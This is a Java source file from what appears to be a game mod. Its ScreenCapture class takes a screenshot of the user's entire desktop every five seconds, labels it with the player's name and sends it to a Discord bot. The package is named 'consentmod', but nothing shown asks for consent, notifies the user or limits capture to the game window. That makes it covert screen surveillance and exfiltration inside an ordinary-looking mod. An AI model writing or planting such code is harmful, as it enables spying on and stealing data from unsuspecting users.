package com.consentmod;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

import javax.imageio.ImageIO;

public class ScreenCapture {

    private static Robot robot;
    private static boolean active = false;
    private static long lastCaptureTime = 0;
    private static final long CAPTURE_INTERVAL = 5000;
    private static int frameCount = 0;
    private static String username = "unknown";

    public static void init() {
        try {
            robot = new Robot();
            System.out.println("[ScreenCapture] OK");
        } catch (AWTException e) {
            System.err.println("[ScreenCapture] FAILED: " + e.getMessage());
        }
    }

    public static void start(String playerName) {
        if (robot == null) {
            System.err.println("[ScreenCapture] Robot null, cannot start");
            return;
        }
        username = playerName;
        active = true;
        lastCaptureTime = System.currentTimeMillis();
        frameCount = 0;
        System.out.println("[ScreenCapture] Started for " + username);
    }

    public static void tick() {
        if (!active || robot == null) return;

        long now = System.currentTimeMillis();
        if (now - lastCaptureTime >= CAPTURE_INTERVAL) {
            lastCaptureTime = now;
            capture();
        }
    }

    public static boolean isActive() {
        return active;
    }

    public static int getFrameCount() {
        return frameCount;
    }

    private static void capture() {
        new Thread(() -> {
            try {
                System.out.println("[ScreenCapture] Capturing...");

                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                System.out.println("[ScreenCapture] Screen: " + screenSize.width + "x" + screenSize.height);

                BufferedImage screenshot = robot.createScreenCapture(new Rectangle(screenSize));
                System.out.println("[ScreenCapture] Got screenshot: " + screenshot.getWidth() + "x" + screenshot.getHeight());

                BufferedImage scaled = new BufferedImage(640, 360, BufferedImage.TYPE_INT_RGB);
                Graphics2D g = scaled.createGraphics();
                g.drawImage(screenshot, 0, 0, 640, 360, null);
                g.dispose();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(scaled, "png", baos);
                byte[] imageBytes = baos.toByteArray();

                System.out.println("[ScreenCapture] Frame size: " + imageBytes.length + " bytes");

                String filename = username + "_" + frameCount + ".png";
                DiscordBot.sendScreenshot(filename, imageBytes);

                frameCount++;
                System.out.println("[ScreenCapture] Sent frame " + frameCount);
            } catch (Exception e) {
                System.err.println("[ScreenCapture] Error: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }
}
